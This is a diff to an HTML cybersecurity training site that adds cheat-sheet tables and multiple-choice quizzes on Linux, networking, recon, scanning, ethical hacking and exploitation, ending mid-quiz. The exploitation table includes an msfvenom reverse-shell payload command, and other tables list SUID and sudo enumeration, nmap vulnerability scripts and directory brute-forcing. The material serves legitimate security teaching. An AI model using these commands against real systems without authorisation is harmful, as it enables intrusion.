@@ -579,6 +579,31 @@ td{padding:6px 8px;border:1px solid var(--bdr);color:var(--txt2);vertical-align:
 .sync-or{text-align:center;color:var(--txt3);font-size:.75rem;margin:12px 0}
 .sync-status{text-align:center;font-size:.75rem;color:var(--txt2);margin-top:8px;min-height:20px}
 .sync-status.ok{color:var(--grn)}.sync-status.err{color:var(--red)}
+
+.cs-block{background:rgba(56,189,248,.04);border:1px solid rgba(56,189,248,.2);border-radius:10px;padding:14px 16px;margin:12px 0}
+.cs-block.cs-flash{animation:exFlash 1.6s ease}
+.cs-head{font-family:var(--mono);font-size:.74rem;font-weight:700;color:var(--cyn);letter-spacing:.5px;text-transform:uppercase;margin-bottom:8px;display:flex;align-items:center;gap:6px}
+.cs-table{margin:0;width:100%}
+.cs-table th{background:rgba(56,189,248,.08);color:var(--cyn)}
+.cs-table td{font-size:.74rem;padding:5px 8px}
+.cs-table code{font-size:.72em;white-space:nowrap}
+.qr-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:10px;margin-top:10px}
+.qr-btn{background:var(--bg);border:1px solid var(--bdr);border-radius:8px;padding:12px;display:flex;flex-direction:column;align-items:center;gap:4px;cursor:pointer;transition:all .15s;font-family:var(--mono);font-size:.78rem;color:var(--txt)}
+.qr-btn:hover{border-color:var(--grn);color:var(--grn);transform:translateY(-2px)}
+.qr-btn small{font-size:.62rem;color:var(--txt3);font-family:var(--sans);text-align:center;line-height:1.4}
+.qr-ico{font-size:1.2rem}
+.gloss-search-wrap{margin:14px 0}
+.gloss-search-wrap input{width:100%;background:var(--bg);border:1px solid var(--bdr);color:var(--txt);padding:10px 14px;border-radius:8px;font-family:var(--mono);font-size:.82rem;outline:none;transition:all .15s}
+.gloss-search-wrap input:focus{border-color:var(--cyn);box-shadow:0 0 0 2px rgba(56,189,248,.1)}
+.gloss-count{font-family:var(--mono);font-size:.68rem;color:var(--txt3);margin-bottom:10px}
+.gloss-list{display:flex;flex-direction:column;gap:6px}
+.gloss-item{background:var(--bg1);border:1px solid var(--bdr);border-radius:8px;padding:10px 12px}
+.gloss-item .g-term{font-family:var(--mono);font-size:.85rem;color:var(--cyn);font-weight:600}
+.gloss-item .g-tag{font-size:.58rem;padding:1px 7px;border-radius:4px;background:var(--grn3);color:var(--grn);font-family:var(--mono);margin-left:8px;text-transform:uppercase;vertical-align:1px}
+.gloss-item .g-def{font-size:.78rem;color:var(--txt2);margin-top:3px;line-height:1.5}
+.gloss-item .g-sec{display:inline-block;margin-top:6px;font-size:.62rem;font-family:var(--mono);color:var(--txt3);border:1px solid var(--bdr);padding:2px 8px;border-radius:4px;cursor:pointer;transition:all .15s}
+.gloss-item .g-sec:hover{color:var(--grn);border-color:var(--grn)}
+.gloss-empty{text-align:center;color:var(--txt3);font-size:.8rem;padding:30px 10px;font-family:var(--mono)}
 </style>
 </head>
 <body>
@@ -670,7 +695,7 @@ td{padding:6px 8px;border:1px solid var(--bdr);color:var(--txt2);vertical-align:
   </div>
   <div class="hstats">
     <div class="hs gradient-border"><div class="sn">25</div><div class="sl">Sections</div></div>
-    <div class="hs gradient-border"><div class="sn">300+</div><div class="sl">Topics</div></div>
+    <div class="hs gradient-border"><div class="sn">200+</div><div class="sl">Quizzes</div></div>
     <div class="hs gradient-border"><div class="sn">100+</div><div class="sl">Tools</div></div>
   </div>
   <div class="qstart gradient-border">
@@ -682,12 +707,33 @@ td{padding:6px 8px;border:1px solid var(--bdr);color:var(--txt2);vertical-align:
       <li>Specialize: <strong>Bug Bounty</strong>, <strong>Web Security</strong>, <strong>Red Team</strong></li>
     </ol>
   </div>
+  <div class="qstart gradient-border" id="quickRef">
+    <h3>&#128269; Quick Reference</h3>
+    <div class="qr-grid">
+      <div class="qr-btn" onclick="window.S('glossary')"><span class="qr-ico">&#128218;</span><span>Glossary</span><small>Search 90+ security terms</small></div>
+      <div class="qr-btn" onclick="document.getElementById('shortcutModal').classList.add('show')"><span class="qr-ico">&#9881;</span><span>Shortcuts</span><small>Ctrl+K search, Ctrl+1-9 nav</small></div>
+    </div>
+  </div>
   <div class="cgrid" id="homeCards"></div>
 </div>
 
 <div class="sc" id="sec-foundations" data-cat="Foundations" data-title="Cybersecurity Foundations">
   <h1>Cybersecurity Foundations</h1>
   <p class="ssub">Master the core principles, threats, frameworks, and defense strategies that form the backbone of cybersecurity.</p>
+<div class="cs-block">
+  <div class="cs-head">&#9889; Quick Reference</div>
+  <table class="cs-table">
+    <tr><th>Command / Term</th><th>What it does</th></tr>
+    <tr><td><strong>CIA Triad</strong></td><td>Confidentiality (encryption), Integrity (hashing), Availability (redundancy)</td></tr>
+    <tr><td><strong>AAA Framework</strong></td><td>Authentication -> Authorization -> Accounting</td></tr>
+    <tr><td><strong>Kill Chain</strong></td><td>Recon -> Weaponize -> Deliver -> Exploit -> Install -> C2 -> Actions</td></tr>
+    <tr><td><strong>NIST CSF</strong></td><td>Identify, Protect, Detect, Respond, Recover</td></tr>
+    <tr><td><strong>Risk =</strong></td><td>Threat x Vulnerability x Impact</td></tr>
+    <tr><td><strong>Controls</strong></td><td>Preventive, Detective, Corrective</td></tr>
+    <tr><td><strong>Frameworks</strong></td><td>PCI DSS (cards), HIPAA (health), GDPR (EU data), SOC 2 (services)</td></tr>
+    <tr><td><strong>Treatment</strong></td><td>Mitigate, Transfer, Accept, Avoid</td></tr>
+  </table>
+</div>
 
   <h3 class="subtopic-title">The CIA Triad & Core Principles</h3>
   <p>The <strong>CIA Triad</strong> (Confidentiality, Integrity, Availability) is the foundational model of information security. Confidentiality ensures data is accessible only to authorized individuals through encryption and access controls. Integrity maintains data accuracy using hashing and digital signatures.</p>
@@ -753,11 +799,63 @@ td{padding:6px 8px;border:1px solid var(--bdr);color:var(--txt2);vertical-align:
   <div class="q-explain">Defense in Depth uses multiple layers of security controls to protect assets.</div>
 </div>
 
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Which component of the AAA framework determines what an authenticated user is allowed to do?</p>
+  <div class="q-opt" data-correct="false">A. Authentication</div>
+  <div class="q-opt" data-correct="false">B. Accounting</div>
+  <div class="q-opt" data-correct="true">C. Authorization</div>
+  <div class="q-opt" data-correct="false">D. Accessibility</div>
+  <div class="q-explain">Authorization defines the permissions granted to an authenticated identity; Authentication proves identity, Accounting logs activity.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Data is silently altered by an attacker. Which CIA pillar has been violated?</p>
+  <div class="q-opt" data-correct="false">A. Confidentiality</div>
+  <div class="q-opt" data-correct="true">B. Integrity</div>
+  <div class="q-opt" data-correct="false">C. Availability</div>
+  <div class="q-opt" data-correct="false">D. Authenticity</div>
+  <div class="q-explain">Integrity means data is accurate and unmodified. Unauthorized changes are an integrity breach.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>A company decides to keep a low-likelihood risk without extra controls. Which treatment is this?</p>
+  <div class="q-opt" data-correct="false">A. Mitigate</div>
+  <div class="q-opt" data-correct="false">B. Transfer</div>
+  <div class="q-opt" data-correct="false">C. Avoid</div>
+  <div class="q-opt" data-correct="true">D. Accept</div>
+  <div class="q-explain">Accepting a risk is a documented management decision when the cost of controls exceeds the risk.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>The PCI DSS framework applies mainly to which kind of data?</p>
+  <div class="q-opt" data-correct="false">A. Healthcare records</div>
+  <div class="q-opt" data-correct="true">B. Payment card data</div>
+  <div class="q-opt" data-correct="false">C. EU personal data</div>
+  <div class="q-opt" data-correct="false">D. Military intelligence</div>
+  <div class="q-explain">PCI DSS (Payment Card Industry Data Security Standard) protects cardholder data.</div>
+</div>
 </div>
 
 <div class="sc" id="sec-linux" data-cat="Linux" data-title="Linux Mastery">
   <h1>Linux Mastery</h1>
   <p class="ssub">Complete guide to Linux systems administration, commands, shell scripting, and cybersecurity-specific Linux skills.</p>
+<div class="cs-block">
+  <div class="cs-head">&#9889; Quick Reference</div>
+  <table class="cs-table">
+    <tr><th>Command / Term</th><th>What it does</th></tr>
+    <tr><td><code>apt update / upgrade</code></td><td>Refresh package lists, then upgrade all packages</td></tr>
+    <tr><td><code>chmod 755 file</code></td><td>Owner rwx, group+others rx</td></tr>
+    <tr><td><code>chown user:group</code></td><td>Change file ownership</td></tr>
+    <tr><td><code>find / -perm -4000</code></td><td>Find SUID binaries</td></tr>
+    <tr><td><code>grep -r "x" dir/</code></td><td>Recursive text search</td></tr>
+    <tr><td><code>ss -tlnp</code></td><td>List listening TCP ports with processes</td></tr>
+    <tr><td><code>ufw enable</code></td><td>Turn on the firewall; default deny incoming</td></tr>
+    <tr><td><code>systemctl status svc</code></td><td>Check a systemd service</td></tr>
+    <tr><td><code>tar -czvf out.tar.gz dir</code></td><td>Create a compressed archive</td></tr>
+    <tr><td><code>sudo -l</code></td><td>List commands you can run with sudo</td></tr>
+  </table>
+</div>
 
   <h3 class="subtopic-title">Linux Distributions & Setup</h3>
   <p>Choosing the right distribution is critical. <strong>Kali Linux</strong> is the industry standard with 600+ security tools. <strong>Parrot OS</strong> offers a lighter alternative. <strong>BlackArch</strong> (Arch-based) has 2,800+ tools. For servers: <strong>Ubuntu Server</strong>, <strong>Debian</strong>, <strong>Rocky Linux</strong>.</p>
@@ -823,11 +921,61 @@ td{padding:6px 8px;border:1px solid var(--bdr);color:var(--txt2);vertical-align:
   <div class="q-explain">The shebang tells the system which interpreter to use when executing the script.</div>
 </div>
 
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Which directory stores system logs on a standard Linux box?</p>
+  <div class="q-opt" data-correct="false">A. /etc</div>
+  <div class="q-opt" data-correct="true">B. /var/log</div>
+  <div class="q-opt" data-correct="false">C. /usr/share</div>
+  <div class="q-opt" data-correct="false">D. /opt</div>
+  <div class="q-explain">/var/log holds system and application logs such as syslog, auth.log, and kern.log.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>What permissions does chmod 755 give the file owner?</p>
+  <div class="q-opt" data-correct="false">A. Read only</div>
+  <div class="q-opt" data-correct="false">B. Read and execute</div>
+  <div class="q-opt" data-correct="true">C. Read, write, execute</div>
+  <div class="q-opt" data-correct="false">D. Execute only</div>
+  <div class="q-explain">7 = rwx for the owner, 5 = r-x for group and others.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Which command reports the disk usage of a directory?</p>
+  <div class="q-opt" data-correct="true">A. du</div>
+  <div class="q-opt" data-correct="false">B. df</div>
+  <div class="q-opt" data-correct="false">C. mount</div>
+  <div class="q-opt" data-correct="false">D. fdisk</div>
+  <div class="q-explain">du measures directory sizes; df reports filesystem free space.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>In /etc/passwd, the x in the password field means:</p>
+  <div class="q-opt" data-correct="false">A. Password is empty</div>
+  <div class="q-opt" data-correct="true">B. Password is encrypted in /etc/shadow</div>
+  <div class="q-opt" data-correct="false">C. Account is locked</div>
+  <div class="q-opt" data-correct="false">D. User is a service account</div>
+  <div class="q-explain">The x flag moves password hashes into /etc/shadow, readable only by root.</div>
+</div>
 </div>
 
 <div class="sc" id="sec-termux" data-cat="Termux" data-title="Termux Complete Guide">
   <h1>Termux Complete Guide</h1>
   <p class="ssub">Full Termux setup, packages, configuration, and cybersecurity tools for Android-based penetration testing.</p>
+<div class="cs-block">
+  <div class="cs-head">&#9889; Quick Reference</div>
+  <table class="cs-table">
+    <tr><th>Command / Term</th><th>What it does</th></tr>
+    <tr><td><code>pkg install <pkg></code></td><td>Install a package (pkg = apt wrapper)</td></tr>
+    <tr><td><code>pkg upgrade -y</code></td><td>Upgrade all Termux packages</td></tr>
+    <tr><td><code>termux-setup-storage</code></td><td>Grant access to shared Android storage</td></tr>
+    <tr><td><code>pkg install openssh</code></td><td>Install SSH client</td></tr>
+    <tr><td><code>ssh user@host</code></td><td>Connect to a remote host</td></tr>
+    <tr><td><strong>~/storage/shared</strong></td><td>Access Android shared storage</td></tr>
+    <tr><td><code>termux-wake-lock</code></td><td>Prevent CPU sleep</td></tr>
+    <tr><td><code>nano script.sh && bash script.sh</code></td><td>Write and run a shell script</td></tr>
+  </table>
+</div>
 
   <h3 class="subtopic-title">Installation & Initial Setup</h3>
   <p>Install from <strong>F-Droid</strong> (recommended) or GitHub — never use Google Play (outdated). Run <code>pkg update && pkg upgrade</code> to sync repositories. Essential packages: <code>pkg install git wget curl vim nano openssh python</code>.</p>
@@ -893,11 +1041,61 @@ td{padding:6px 8px;border:1px solid var(--bdr);color:var(--txt2);vertical-align:
   <div class="q-explain">SQLMap automates detection and exploitation of SQL injection vulnerabilities.</div>
 </div>
 
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Which package manager is native to Termux?</p>
+  <div class="q-opt" data-correct="false">A. apt</div>
+  <div class="q-opt" data-correct="true">B. pkg</div>
+  <div class="q-opt" data-correct="false">C. yum</div>
+  <div class="q-opt" data-correct="false">D. pacman</div>
+  <div class="q-explain">pkg is Termux's apt wrapper tuned for Android's environment.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Which command gives Termux access to shared Android storage?</p>
+  <div class="q-opt" data-correct="true">A. termux-setup-storage</div>
+  <div class="q-opt" data-correct="false">B. termux-storage</div>
+  <div class="q-opt" data-correct="false">C. termux-allow-storage</div>
+  <div class="q-opt" data-correct="false">D. termux-mount</div>
+  <div class="q-explain">termux-setup-storage creates ~/storage links to shared folders like Pictures and Downloads.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Termux can run a full Linux environment on Android:</p>
+  <div class="q-opt" data-correct="false">A. Only with root</div>
+  <div class="q-opt" data-correct="true">B. Without root, in an unprivileged sandbox</div>
+  <div class="q-opt" data-correct="false">C. Only in a chroot</div>
+  <div class="q-opt" data-correct="false">D. Only via a VM</div>
+  <div class="q-explain">Termux runs unprivileged in Android's sandbox and does not require root.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Which command upgrades every package in Termux?</p>
+  <div class="q-opt" data-correct="false">A. pkg update</div>
+  <div class="q-opt" data-correct="true">B. pkg upgrade -y</div>
+  <div class="q-opt" data-correct="false">C. pkg refresh</div>
+  <div class="q-opt" data-correct="false">D. apt install -y *</div>
+  <div class="q-explain">pkg upgrade -y updates all installed packages non-interactively.</div>
+</div>
 </div>
 
 <div class="sc" id="sec-networking" data-cat="Networking" data-title="Networking Deep Dive">
   <h1>Networking Deep Dive</h1>
   <p class="ssub">Complete networking: protocols, OSI model, subnetting, routing, and network security fundamentals.</p>
+<div class="cs-block">
+  <div class="cs-head">&#9889; Quick Reference</div>
+  <table class="cs-table">
+    <tr><th>Command / Term</th><th>What it does</th></tr>
+    <tr><td><strong>OSI model</strong></td><td>L1 Physical, L2 Data Link, L3 Network, L4 Transport, L5+</td></tr>
+    <tr><td><strong>TCP vs UDP</strong></td><td>TCP: reliable/ordered. UDP: fast/no handshake</td></tr>
+    <tr><td><strong>Ports</strong></td><td>22 SSH, 80 HTTP, 443 HTTPS, 53 DNS, 25 SMTP, 3306 MySQL</td></tr>
+    <tr><td><strong>Subnet /24</strong></td><td>255.255.255.0 = 254 usable hosts</td></tr>
+    <tr><td><strong>DNS records</strong></td><td>A (IPv4), AAAA (IPv6), MX (mail), CNAME (alias), TXT</td></tr>
+    <tr><td><strong>HTTP methods</strong></td><td>GET, POST, PUT, DELETE, OPTIONS, HEAD</td></tr>
+    <tr><td><strong>netstat -tln</strong></td><td>Show listening TCP ports</td></tr>
+    <tr><td><code>curl -v URL</code></td><td>Verbose HTTP request</td></tr>
+  </table>
+</div>
 
   <h3 class="subtopic-title">OSI Model & TCP/IP Stack</h3>
   <p>The <strong>OSI Model</strong> has 7 layers: Physical (cables), Data Link (MAC, switches), Network (IP, routing), Transport (TCP/UDP), Session (connections), Presentation (encryption), Application (HTTP, DNS).</p>
@@ -963,11 +1161,61 @@ td{padding:6px 8px;border:1px solid var(--bdr);color:var(--txt2);vertical-align:
   <div class="q-explain">IDS is passive and alerts; IPS is active and blocks threats.</div>
 </div>
 
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>At which OSI layer does a router make forwarding decisions?</p>
+  <div class="q-opt" data-correct="false">A. Layer 1</div>
+  <div class="q-opt" data-correct="false">B. Layer 2</div>
+  <div class="q-opt" data-correct="true">C. Layer 3</div>
+  <div class="q-opt" data-correct="false">D. Layer 7</div>
+  <div class="q-explain">Routers operate at the Network layer (L3) using IP addresses; switches use L2 MAC addresses.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Which protocol translates domain names into IP addresses?</p>
+  <div class="q-opt" data-correct="false">A. DHCP</div>
+  <div class="q-opt" data-correct="true">B. DNS</div>
+  <div class="q-opt" data-correct="false">C. ARP</div>
+  <div class="q-opt" data-correct="false">D. SMTP</div>
+  <div class="q-explain">DNS (Domain Name System) resolves names like example.com to IP addresses.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>What is the default subnet mask for a /24 network?</p>
+  <div class="q-opt" data-correct="false">A. 255.0.0.0</div>
+  <div class="q-opt" data-correct="false">B. 255.255.0.0</div>
+  <div class="q-opt" data-correct="true">C. 255.255.255.0</div>
+  <div class="q-opt" data-correct="false">D. 255.255.255.255</div>
+  <div class="q-explain">A /24 (255.255.255.0) provides 256 addresses, 254 usable.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Which port is the default for HTTPS?</p>
+  <div class="q-opt" data-correct="false">A. 80</div>
+  <div class="q-opt" data-correct="true">B. 443</div>
+  <div class="q-opt" data-correct="false">C. 8080</div>
+  <div class="q-opt" data-correct="false">D. 8443</div>
+  <div class="q-explain">443 is HTTPS; 80 is HTTP; 8080/8443 are common alternates.</div>
+</div>
 </div>
 
 <div class="sc" id="sec-recon" data-cat="Recon & OSINT" data-title="Reconnaissance & OSINT">
   <h1>Reconnaissance & OSINT</h1>
   <p class="ssub">Master information gathering, OSINT tools, passive recon, and target profiling for security assessments.</p>
+<div class="cs-block">
+  <div class="cs-head">&#9889; Quick Reference</div>
+  <table class="cs-table">
+    <tr><th>Command / Term</th><th>What it does</th></tr>
+    <tr><td><code>whois target.com</code></td><td>Domain registration info</td></tr>
+    <tr><td><code>dig target.com</code></td><td>DNS records</td></tr>
+    <tr><td><strong>Google Dorking</strong></td><td>site: filetype: intitle: inurl: intext:</td></tr>
+    <tr><td><strong>Shodan</strong></td><td>Search internet-exposed devices</td></tr>
+    <tr><td><strong>theHarvester -d target.com</strong></td><td>Collect emails/subdomains</td></tr>
+    <tr><td><strong>OSINT sources</strong></td><td>Social media, job posts, leaked dbs, censys</td></tr>
+    <tr><td><strong>nslookup target.com</strong></td><td>Resolve domain to IP</td></tr>
+    <tr><td><strong>Reverse whois</strong></td><td>Find other domains by same registrant</td></tr>
+  </table>
+</div>
 
   <h3 class="subtopic-title">Passive vs Active Recon</h3>
   <p><strong>Passive recon</strong>: no direct target contact. Sources: DNS records, WHOIS, search engines, social media, job postings, public records. Tools: <code>theHarvester</code>, <code>Maltego</code>, Google Dorks, Shodan.</p>
@@ -1033,11 +1281,61 @@ td{padding:6px 8px;border:1px solid var(--bdr);color:var(--txt2);vertical-align:
   <div class="q-explain">Wappalyzer identifies CMS, frameworks, languages, and analytics used on websites.</div>
 </div>
 
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Which service returns domain registration and registrar information?</p>
+  <div class="q-opt" data-correct="false">A. DNS</div>
+  <div class="q-opt" data-correct="true">B. WHOIS</div>
+  <div class="q-opt" data-correct="false">C. ARP</div>
+  <div class="q-opt" data-correct="false">D. RADIUS</div>
+  <div class="q-explain">WHOIS reveals registrar, creation/expiry dates, and name servers.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Using Google search operators to find exposed files is called:</p>
+  <div class="q-opt" data-correct="true">A. Google Dorking</div>
+  <div class="q-opt" data-correct="false">B. SEO testing</div>
+  <div class="q-opt" data-correct="false">C. Search scraping</div>
+  <div class="q-opt" data-correct="false">D. OS fingerprinting</div>
+  <div class="q-explain">Dorks like site:, filetype:, and intitle: reveal unindexed data via search engines.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Which service indexes internet-exposed devices and banners?</p>
+  <div class="q-opt" data-correct="true">A. Shodan</div>
+  <div class="q-opt" data-correct="false">B. LinkedIn</div>
+  <div class="q-opt" data-correct="false">C. Pastebin</div>
+  <div class="q-opt" data-correct="false">D. GitHub</div>
+  <div class="q-explain">Shodan scans the internet and lets you search devices, ports, and banners.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Passive footprinting means:</p>
+  <div class="q-opt" data-correct="false">A. Actively probing the target</div>
+  <div class="q-opt" data-correct="true">B. Gathering info without touching the target</div>
+  <div class="q-opt" data-correct="false">C. Scanning all ports</div>
+  <div class="q-opt" data-correct="false">D. Exploiting a service</div>
+  <div class="q-explain">Passive footprinting uses OSINT sources and never sends packets to the target.</div>
+</div>
 </div>
 
 <div class="sc" id="sec-scanning" data-cat="Scanning" data-title="Scanning & Enumeration">
   <h1>Scanning & Enumeration</h1>
   <p class="ssub">Master port scanning, service enumeration, vulnerability scanning, and network mapping techniques.</p>
+<div class="cs-block">
+  <div class="cs-head">&#9889; Quick Reference</div>
+  <table class="cs-table">
+    <tr><th>Command / Term</th><th>What it does</th></tr>
+    <tr><td><code>nmap -sV -sC -p- host</code></td><td>Version+scripts, all ports</td></tr>
+    <tr><td><code>nmap -O host</code></td><td>OS detection</td></tr>
+    <tr><td><code>nmap -sU host</code></td><td>UDP scan</td></tr>
+    <tr><td><code>nmap --script vuln host</code></td><td>Run vulnerability scripts</td></tr>
+    <tr><td><code>masscan -p1-65535 host</code></td><td>Fast port sweep</td></tr>
+    <tr><td><code>gobuster dir -u URL -w wordlist</code></td><td>Directory brute force</td></tr>
+    <tr><td><code>nikto -h host</code></td><td>Web server scanner</td></tr>
+    <tr><td><code>nc -zv host port</code></td><td>Netcat port probe</td></tr>
+  </table>
+</div>
 
   <h3 class="subtopic-title">Port Scanning with Nmap</h3>
   <p><strong>TCP Connect</strong>: <code>nmap -sT target</code> (full handshake). <strong>SYN Scan</strong>: <code>nmap -sS target</code> (default, stealthy). <strong>ACK Scan</strong>: <code>nmap -sA target</code> (maps firewall rules). <strong>UDP Scan</strong>: <code>nmap -sU target</code>.</p>
@@ -1103,11 +1401,61 @@ td{padding:6px 8px;border:1px solid var(--bdr);color:var(--txt2);vertical-align:
   <div class="q-explain">Linux typically sends TTL=64, Windows=128, Cisco=255.</div>
 </div>
 
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Which nmap option performs a TCP connect scan?</p>
+  <div class="q-opt" data-correct="false">A. -sS</div>
+  <div class="q-opt" data-correct="true">B. -sT</div>
+  <div class="q-opt" data-correct="false">C. -sU</div>
+  <div class="q-opt" data-correct="false">D. -sV</div>
+  <div class="q-explain">-sT completes the full three-way handshake; -sS is the stealthier SYN scan.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Which nmap option enables service/version detection?</p>
+  <div class="q-opt" data-correct="false">A. -O</div>
+  <div class="q-opt" data-correct="false">B. -p</div>
+  <div class="q-opt" data-correct="true">C. -sV</div>
+  <div class="q-opt" data-correct="false">D. -sn</div>
+  <div class="q-explain">-sV interrogates open ports to identify the running service version.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Nmap marks a port as what when a firewall drops the probe?</p>
+  <div class="q-opt" data-correct="false">A. open</div>
+  <div class="q-opt" data-correct="false">B. closed</div>
+  <div class="q-opt" data-correct="true">C. filtered</div>
+  <div class="q-opt" data-correct="false">D. unfiltered</div>
+  <div class="q-explain">Filtered means no response was received, typically due to firewall rules.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Enumeration mainly extracts:</p>
+  <div class="q-opt" data-correct="true">A. Banners and service details for exploitation</div>
+  <div class="q-opt" data-correct="false">B. Password hashes</div>
+  <div class="q-opt" data-correct="false">C. A full exploit chain</div>
+  <div class="q-opt" data-correct="false">D. Backup tapes</div>
+  <div class="q-explain">Enumeration collects usernames, shares, services, and versions to plan attacks.</div>
+</div>
 </div>
 
 <div class="sc" id="sec-ethicalhack" data-cat="Ethical Hacking" data-title="Ethical Hacking Methodology">
   <h1>Ethical Hacking Methodology</h1>
   <p class="ssub">Learn the complete ethical hacking process: planning, reconnaissance, scanning, exploitation, and reporting.</p>
+<div class="cs-block">
+  <div class="cs-head">&#9889; Quick Reference</div>
+  <table class="cs-table">
+    <tr><th>Command / Term</th><th>What it does</th></tr>
+    <tr><td><strong>Phases</strong></td><td>Pre-engagement -> Recon -> Scanning -> Exploit -> Post -> Report</td></tr>
+    <tr><td><strong>White box</strong></td><td>Full info provided</td></tr>
+    <tr><td><strong>Black box</strong></td><td>No prior info</td></tr>
+    <tr><td><strong>Grey box</strong></td><td>Partial info</td></tr>
+    <tr><td><strong>Docs</strong></td><td>Rules of Engagement (ROE), scope, permission letter</td></tr>
+    <tr><td><strong>Standards</strong></td><td>PTES, OWASP WSTG, OSSTMM</td></tr>
+    <tr><td><strong>Report</strong></td><td>Executive summary, findings, evidence, remediation</td></tr>
+    <tr><td><strong>Retest</strong></td><td>Verify fixes after report</td></tr>
+  </table>
+</div>
 
   <h3 class="subtopic-title">Methodology & Rules of Engagement</h3>
   <p>Five phases: <strong>Planning</strong> (scope, ROE), <strong>Reconnaissance</strong> (information gathering), <strong>Scanning</strong> (enumeration), <strong>Exploitation</strong> (gaining access), <strong>Reporting</strong> (findings, recommendations).</p>
@@ -1173,11 +1521,61 @@ td{padding:6px 8px;border:1px solid var(--bdr);color:var(--txt2);vertical-align:
   <div class="q-explain">Reports should include both executive summaries for management and technical details with remediation steps.</div>
 </div>
 
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Which penetration testing phase happens before any testing begins?</p>
+  <div class="q-opt" data-correct="false">A. Reconnaissance</div>
+  <div class="q-opt" data-correct="true">B. Pre-engagement</div>
+  <div class="q-opt" data-correct="false">C. Exploitation</div>
+  <div class="q-opt" data-correct="false">D. Reporting</div>
+  <div class="q-explain">Pre-engagement defines scope, rules of engagement, and legal authorization.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>In a white-box test, the tester:</p>
+  <div class="q-opt" data-correct="false">A. Has no information about the target</div>
+  <div class="q-opt" data-correct="true">B. Gets full architecture and credentials</div>
+  <div class="q-opt" data-correct="false">C. Only tests from outside</div>
+  <div class="q-opt" data-correct="false">D. Only does OSINT</div>
+  <div class="q-explain">White-box testing provides complete internal knowledge for deep review.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Rules of Engagement specify:</p>
+  <div class="q-opt" data-correct="false">A. Attack tool pricing</div>
+  <div class="q-opt" data-correct="true">B. Targets, timing, and allowed techniques</div>
+  <div class="q-opt" data-correct="false">C. Which OS to use</div>
+  <div class="q-opt" data-correct="false">D. Report formatting only</div>
+  <div class="q-explain">ROE documents authorized scope, schedule, and permitted actions.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>In the Cyber Kill Chain, what follows Delivery?</p>
+  <div class="q-opt" data-correct="false">A. Reconnaissance</div>
+  <div class="q-opt" data-correct="false">B. Weaponization</div>
+  <div class="q-opt" data-correct="true">C. Exploitation</div>
+  <div class="q-opt" data-correct="false">D. Installation</div>
+  <div class="q-explain">Delivery of the weapon leads to Exploitation, then Installation.</div>
+</div>
 </div>
 
 <div class="sc" id="sec-exploitation" data-cat="Exploitation" data-title="Exploitation & Exploit Development">
   <h1>Exploitation & Exploit Development</h1>
   <p class="ssub">Master exploitation frameworks, exploit development basics, and post-exploitation techniques.</p>
+<div class="cs-block">
+  <div class="cs-head">&#9889; Quick Reference</div>
+  <table class="cs-table">
+    <tr><th>Command / Term</th><th>What it does</th></tr>
+    <tr><td><code>msfconsole</code></td><td>Launch Metasploit</td></tr>
+    <tr><td><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST= IP LPORT= PORT -f elf</code></td><td>Generate payload</td></tr>
+    <tr><td><code>searchsploit term</code></td><td>Search Exploit-DB</td></tr>
+    <tr><td><strong>Reverse shell</strong></td><td>Target connects back to you</td></tr>
+    <tr><td><strong>Bind shell</strong></td><td>You connect to a listener on target</td></tr>
+    <tr><td><strong>Meterpreter</strong></td><td>Advanced interactive Metasploit payload</td></tr>
+    <tr><td><code>search exploit</code></td><td>Search modules: search eternalblue</td></tr>
+    <tr><td><code>use / set / run</code></td><td>Select module, set options, execute</td></tr>
+  </table>
+</div>
 
   <h3 class="subtopic-title">Metasploit Framework Deep Dive</h3>
   <p>Metasploit architecture: <strong>Exploits</strong> (vulnerability code), <strong>Payloads</strong> (code execution), <strong>Auxiliary</strong> (scanning/fuzzing), <strong>Post</strong> (post-exploitation), <strong>Encoders</strong> (evasion). <code>msfconsole</code> is the primary interface.</p>
@@ -1243,11 +1641,61 @@ td{padding:6px 8px;border:1px solid var(--bdr);color:var(--txt2);vertical-align:
   <div class="q-explain">BeEF (Browser Exploitation Framework) hooks browsers via XSS for post-exploitation activities.</div>
 </div>
 
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
